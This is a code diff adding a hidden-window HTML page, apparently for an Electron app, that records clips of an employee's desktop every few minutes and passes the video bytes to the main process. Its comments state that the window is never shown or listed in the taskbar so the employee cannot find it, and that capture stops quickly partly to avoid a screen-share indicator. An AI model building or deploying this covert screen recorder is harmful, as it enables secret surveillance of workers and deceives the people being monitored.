@@ -1,0 +1,62 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>.</title>
+<body style="margin: 0; background: #000"></body>
+<script>
+  /*
+   * Runs in a hidden window. MediaRecorder is a renderer API, so the actual
+   * encoding has to happen somewhere with a DOM -- but this window is never
+   * shown, never in the taskbar, and holds nothing the employee could find.
+   *
+   * One clip per message: the main process says which screen and for how long,
+   * this records it and hands the bytes straight back.
+   */
+  window.recorder.onRecord(async ({ jobId, sourceId, durationMs, maxWidth, frameRate }) => {
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: {
+          mandatory: {
+            chromeMediaSource: 'desktop',
+            chromeMediaSourceId: sourceId,
+            maxWidth,
+            maxFrameRate: frameRate,
+          },
+        },
+      });
+
+      const track = stream.getVideoTracks()[0];
+      const { width = 0, height = 0 } = track.getSettings?.() || {};
+
+      // VP8 rather than VP9: it encodes far faster, which matters when this is
+      // running on someone's working machine every few minutes.
+      const mimeType = ['video/webm;codecs=vp8', 'video/webm'].find((t) => MediaRecorder.isTypeSupported(t));
+      const chunks = [];
+      const rec = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 600_000 });
+
+      const finished = new Promise((resolve, reject) => {
+        rec.ondataavailable = (e) => e.data.size && chunks.push(e.data);
+        rec.onstop = resolve;
+        rec.onerror = (e) => reject(e.error || new Error('MediaRecorder failed'));
+      });
+
+      rec.start();
+      await new Promise((r) => setTimeout(r, durationMs));
+      rec.stop();
+      await finished;
+
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const bytes = new Uint8Array(await blob.arrayBuffer());
+      if (!bytes.length) throw new Error('The clip came out empty');
+
+      window.recorder.done(jobId, { bytes, width, height, durationMs });
+    } catch (err) {
+      window.recorder.fail(jobId, String(err?.message || err));
+    } finally {
+      // Release the capture immediately -- a live desktop stream left open is
+      // both a resource leak and a screen-share indicator on some systems.
+      stream?.getTracks().forEach((t) => t.stop());
+    }
+  });
+</script>
